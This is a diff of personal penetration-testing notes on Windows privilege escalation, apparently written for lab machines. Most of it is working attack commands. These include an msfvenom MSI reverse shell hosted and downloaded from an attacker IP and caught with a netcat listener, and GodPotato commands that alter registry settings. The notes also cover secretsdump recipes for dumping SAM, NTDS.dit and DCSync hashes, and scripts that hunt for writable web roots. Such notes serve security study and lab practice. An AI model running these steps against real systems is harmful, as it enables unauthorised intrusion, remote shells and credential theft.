@@ -1,3 +1,46 @@
+winPEAS
+```
+powershell -ep Bypass -File .\winPEAS.ps1 | Tee-Object -FilePath peas-output.txt
+```
+```
+powershell -ep Bypass -File .\winPEASx64.exe | Tee-Object -FilePath peas-output2.txt
+```
+- both versions are located in my `~/Downloads` folder, which is shared with xfreerdp command
+- if can't run or hangs, output may be too big for window. try this:
+```powershell
+Start-Process -FilePath ".\winPEASx64.exe" -NoNewWindow -Wait -RedirectStandardOutput output.txt
+```
+- command might take a bit to complete
+#### AlwaysInstallElevated
+*Allows current user to install msi's as Administrator*
+- will see on winpeas:
+	- AlwaysInstallElevated set to 1 in HKLM and HKCU set to 1
+	- ![[Pasted image 20250504200940.png]]
+```
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.21.90.250 LPORT=6969 -f msi > privesc.msi
+```
+- create msi rev shell
+```
+python -m http.server 80
+```
+- host with python server
+```
+wget http://10.21.90.250/privesc.msi -o privesc.msi
+```
+- transfer to machine
+```
+rlwrap -cAr nc -lvnp 6969
+```
+- setup listener
+```
+runas /user:dev-datasci-lowpriv "msiexec /quiet /qn /i C:\Users\dev-datasci-lowpriv\Desktop\privesc.msi"
+```
+- run as specific user, catch shell with listener
+- or from powershell:
+```powershell
+cmd /c "msiexec /quiet /qn /i C:\users\cyberlens\desktop\privesc.msi"
+```
+
 PowerUp.ps1
 - make sure to run in powershell
 - copy to target machine
@@ -19,6 +62,12 @@ JuicyPotatoNG.exe
 - `rlwrap -cAr nc -lnvp 8082`
 - 
 GodPotato
+```
+reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NET Framework Setup\NDP"
+```
+- get NET framework version
+![[Pasted image 20250519180318.png]]
+- v4.0 so use `-NET4`
 	- Create RDP admin user:
 ```
 .\GodPotato-NET4.exe -cmd "cmd /c reg add \"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f"
@@ -39,7 +88,7 @@ other versions: [https://book.hacktricks.xyz/windows-hardening/windows-local-pri
 - https://github.com/itm4n/PrintSpoofer/releases
 
 ***SeMachineAccountPrivilege***
-	- See [[#^062636|RBCD Attack]] below
+	- See [[AD#RBCD (Resource Based Constrained Delegation) Attack|RBCD Attack]]
 	- See [[#^8bdeef|DC Sync Attack]] below
 	- See [[#^b9f60c|Azure Connect abuse]] below
 
@@ -74,6 +123,30 @@ diskshadow /s c:\programdata\vss.dsh
 `reg.exe save HKLM\SYSTEM C:\system.hiv` on remote machine, copy SYSTEM reg key to C: drive
 `Copy-Item C:\system.hiv \\10.10.14.172\s\system` on remote machine, copy from C drive to kali
 `secretsdump.py -system system -ntds ntds.dit LOCAL` on kali, to dump hashes from ntds and system file
+
+---
+#### System, Sam, & ntds.dit
+
+| Goal                                    | You Need                                                                                          | Example Command                                                                                                                    |
+| --------------------------------------- | ------------------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------- |
+| Dump SAM from local                     | `SYSTEM` + `SAM`                                                                                  | `secretsdump.py -system SYSTEM -sam SAM LOCAL`                                                                                     |
+| Dump Domain users from offline NTDS.dit | `SYSTEM` + `NTDS.dit` (example command above)                                                     | `secretsdump.py -system SYSTEM -ntds ntds.dit LOCAL`                                                                               |
+| Dump remote machine SAM                 | Valid creds or NTLM hash                                                                          | `secretsdump.py DOMAIN/USERNAME:PASSWORD@TARGET_IP` or<br>`secretsdump.py DOMAIN/USERNAME -hashes :NT_HASH@TARGET_IP`              |
+| Dump DC using DCSync                    | Account with replication rights (`DS-Replication-Get-Changes` + `DS-Replication-Get-Changes-All`) | `secretsdump.py DOMAIN/USERNAME:PASSWORD@DC_IP -just-dc`<br>or<br>`secretsdump.py DOMAIN/USERNAME -hashes :NT_HASH@DC_IP -just-dc` |
+| Dump local machine live (if possible)   | `SYSTEM` + `SAM`, or remote access                                                                | Same as above depending on whether you're offline or remote                                                                        |
+`C:\Windows\System32\config\SAM`
+`C:\Windows\System32\config\SYSTEM`
+`C:\Windows\NTDS\NTDS.dit`
+- ntds.dit is an AD database so on the DC only
+For offline SYSTEM/SAM/NTDS.dit, you typically copy files using:
+- `reg save hklm\SYSTEM SYSTEM`
+- `reg save hklm\SAM SAM`
+- Use `vssadmin` or other Volume Shadow Copy tricks to copy locked NTDS.dit
+For remote dumping, ports required:
+- **TCP 445** (SMB)
+- Sometimes **TCP 135, 139** (RPC)
+User for DCSync must have **replication rights**, usually Domain Admin or equivalent.
+---
 
 ***SeBackUpPrivilege alternate path*** (if ntds or system and sam wont copy):
 - `cd c:\`
@@ -148,6 +221,74 @@ start listener, upload SeRestoreAbuse.exe and nc.exe to C:\temp, and run this co
 ```
 - root shell; might be unstable, use nc to create another shell (will be more stable without SeRestoreAb)
 
+```
+net user
+```
+- check for other users on the machine to move laterally to
+
+Web roots
+```
+$me=[System.Security.Principal.WindowsIdentity]::GetCurrent().Name;'C:\xampp\htdocs','C:\inetpub\wwwroot','C:\wamp\www','C:\laragon\www','C:\nginx\html'|%{if(Test-Path $_){@($_)+(Get-ChildItem $_ -Directory -Recurse -ErrorAction SilentlyContinue|Select-Object -ExpandProperty FullName)|?{Try{(Get-Acl $_).Access|?{$_.IdentityReference -eq $me -and ($_.FileSystemRights -band [System.Security.AccessControl.FileSystemRights]::Modify) -and $_.AccessControlType -eq 'Allow'}}Catch{$false}}}}|Select-Object -Unique
+```
+- crawls common web roots for writable directories
+- also check:
+	- `C:\Apache24\htdocs` 
+	- `C:\Program Files\Apache Software Foundation\Tomcat 9.0\webapps\ROOT`
+
+```
+$me=[System.Security.Principal.WindowsIdentity]::GetCurrent().Name;Get-ChildItem C:\ -Directory -Recurse -ErrorAction SilentlyContinue|Where-Object{$_.FullName -notmatch '^(?:C:\\(?:Windows|Program Files(?: \(x86\))?|ProgramData|Users))(?:\\|$)'}|Where-Object{Try{(Get-Acl $_.FullName).Access|Where-Object{$_.IdentityReference -eq $me -and ($_.FileSystemRights -band [System.Security.AccessControl.FileSystemRights]::Modify) -and $_.AccessControlType -eq 'Allow'}}Catch{$false}}|Select-Object -ExpandProperty FullName
+```
+- find all writable directories (excludes common windows filepaths and Users), but may take a few minutes to run
+
+## ICACLS Permission Flags and Combinations
+
+### 🔑 Flag Definitions
+
+| Flag | Name               | Applies To        | Meaning                                                                 |
+|------|--------------------|-------------------|-------------------------------------------------------------------------|
+| `I`  | Inherited          | Current ACL       | This permission was inherited from the parent folder                    |
+| `OI` | Object Inherit     | Files             | Pass this permission to files inside the folder                         |
+| `CI` | Container Inherit  | Folders           | Pass this permission to subfolders inside the folder                    |
+| `IO` | Inherit Only       | Not this object   | Do not apply to this object—apply only to its children (folders/files)  |
+| `F`  | Full Control       | Files/Folders     | All permissions: read, write, modify, delete, change perms              |
+| `RX` | Read & Execute     | Files/Folders     | Can view and run files                                                  |
+| `R`  | Read               | Files/Folders     | Can view file contents or folder listing                                |
+| `W`  | Write              | Files/Folders     | Can write to files or create new ones                                   |
+| `AD` | Add Files          | Folders           | Can create new files                                                    |
+| `WD` | Write Data         | Files             | Can modify contents of files                                            |
+### 🧪 Common Flag Combinations
+
+| Flags                | Applies To       | Explanation                                                                 |
+|----------------------|------------------|-----------------------------------------------------------------------------|
+| `OI`                 | Files            | Apply to files inside this folder                                           |
+| `CI`                 | Subfolders       | Apply to subfolders inside this folder                                      |
+| `OI, CI`             | Files & Folders  | Apply to both files and subfolders                                          |
+| `CI, IO`             | Subfolders Only  | Permissions inherited **only by subfolders**, not this folder itself        |
+| `OI, IO`             | Files Only       | Permissions inherited **only by files**, not this folder itself             |
+| `OI, CI, IO`         | All children     | Permissions inherited **only by children** (both files and folders), not this object |
+| `OI, CI` (no IO)     | This + children  | Apply to this folder, files, and subfolders                                 |
+### 🧾 Example ACL Output & Explanation
+
+```text
+BUILTIN\Users:(I)(CI)(AD)
+
+    Inherited permission — users can add files only inside subfolders of this directory. They cannot write to this directory itself.
+
+CREATOR OWNER:(I)(OI)(CI)(IO)(F)
+
+    Inherited permission — whoever creates files/folders inside this folder gets full control, but only on the content they create — not on this parent folder.
+
+UserA:(OI)(CI)(F)
+
+    UserA has full control of this folder and everything inside (files and folders).
+
+UserB:(OI)(CI)(IO)(F)
+
+    UserB has full control of all contents, but no permissions on this folder itself.
+```
+
+---
+
 ***Powershell history***
 ```
 type C:\users\rudi.davis\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
@@ -221,6 +362,11 @@ net user <current-user>
 net localgroup administrators
 ```
 
+***recursively view hidden files in current folder:***
+```powershell 
+gci -hidden -force
+```
+
 ***search for hidden/interesting files in root of filesystem:***
 ```
 cmd.exe /c dir /a C:\
@@ -239,16 +385,16 @@ icacls "C:\backup\restore.txt" /grant "Everyone:(R)"
 ```
 
 ***unquoted service paths***
-```
+```powershell
 Get-WmiObject win32_service | Select-Object Name, DisplayName, PathName, StartMode | Where-Object { $_.StartMode -eq "Auto" -and $_.PathName -match ' ' }
 ```
-^powershell
-```
+
+```cmd
 wmic service get name,displayname,pathname,startmode | findstr /i "Auto" | findstr /i /v "C:\Windows\\" | findstr /i /v """
 ```
-^cmd
 
-***Insecure Service Permissions***
+
+***Insecure Service Permissions & Unquoted Service Path***
 ```
 $services = Get-WmiObject -Class win32_service | Select-Object Name, StartName, PathName  
     foreach ($service in $services) {  
@@ -304,14 +450,14 @@ reg add "HKLM\SYSTEM\CurrentControlSet\Services\VulnerableService" /v ImagePath 
 	- `net start VulnerableService`
 
 Credentials in Files
-```
+```powershell
 Select-String -Path "C:\*" -Pattern "password"
 ```
-^powershell
-```
+
+```cmd
 findstr /si password *.txt *.ini *.config
 ```
-^cmd
+
 
 Scheduled Tasks
 ```
@@ -468,35 +614,6 @@ copy \\10.10.14.142\share\nc64.exe \windows\system32\spool\drivers\color\
 - also transfer nc64.exe to that directory
 - after a minute or so, will catch shell from `rlwrap nc -lvnp 443`
 
-#### winpeas
-`.\winPEASx64.exe`
-#### AlwaysInstallElevated
-*Allows current user to install msi's as Administrator*
-- will see on winpeas:
-	- AlwaysInstallElevated set to 1 in HKLM and HKCU set to 1
-	- Also get the AutoLogon credentials for current user
-```
-msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.210.90.250 LPORT=6969 -f msi > privesc.msi
-```
-- create msi rev shell
-```
-python -m http.server 80
-```
-- host with python server
-```
-wget http://10.21.90.250/privesc.msi -o privesc.msi
-```
-- transfer to machine
-```
-rlwrap -cAr nc -lvnp 6969
-```
-- setup listener
-```
-runas /user:dev-datasci-lowpriv "msiexec /quiet /qn /i C:\Users\dev-datasci-lowpriv\Desktop\malicious.msi"
-```
-- run msi shell as admin, catch shell with listener
-
-
 #### AD CS
 - upload Certify.exe
 ```
@@ -574,6 +691,7 @@ Find user with WriteOwner & WriteDACL permissions (in Cert Publishers group for 
 ./Certify.exe find /domain:sequel.htb
 ```
 
+##### ~~RBCD Attack (ESC1)~~ 
 RBCD (Resource Based Constrained Delegation) Attack ^062636
 - Requirements:
 	- `SeMachineAccountPrivilege` shows enabled
@@ -612,7 +730,7 @@ Get-DomainComputer $TargetComputer | Set-DomainObject -Set @{'msds-allowedtoacto
 ```
 - creating ACL step 4: applies security descriptor to the `msds-allowedtoactonbehalfofotheridentity` attribute of the target computer object
 	- check it worked:
-		- `$RawBytes = Get-DomainComputer DC -Properties 'msds-allowedtoactonbehalfofotheridentity' | select -expand msds-allowedtoactonbehalfofotheridentity`
+		- `$RawBytes = Get-DomainComputer 0xdfFakeComputer -Properties 'msds-allowedtoactonbehalfofotheridentity' | select -expand msds-allowedtoactonbehalfofotheridentity`
 		- `$Descriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $RawBytes, 0`
 		- `$Descriptor.DiscretionaryAcl`
 			- will display `AccessAllowed` under AceType if worked
@@ -807,3 +925,27 @@ dir /q "C:\Users\Administrator\Desktop\root.txt"
 icacls "C:\Users\Administrator\Desktop\root.txt" /grant SYSTEM:F
 ```
 - grants system user (yourself) full access
+
+
+#### Check Recycle bin
+```
+cd 'C:\$Recycle.Bin'
+```
+#### Check Files deleted from Recycle bin
+- navigate to hidden folder in powershell. must use quotes because of $ 
+```
+$shell = New-Object -ComObject Shell.Application  
+$recycleBin = $shell.Namespace(0xA)  
+$recycleBin.items() | Select-Object Name, Path
+```
+![[Pasted image 20250419160333.png]]
+```
+$recycleBin = (New-Object -ComObject Shell.Application).NameSpace(0xA)  
+$items = $recycleBin.Items()  
+$item = $items | Where-Object {$_.Name -eq "wapt-backup-sunday.7z"}  
+$documentsPath = [Environment]::GetFolderPath("Desktop")  
+$documents = (New-Object -ComObject Shell.Application).NameSpace($documentsPath)  
+$documents.MoveHere($item)
+```
+![[Pasted image 20250419160540.png]]
+- restore deleted file to desktop
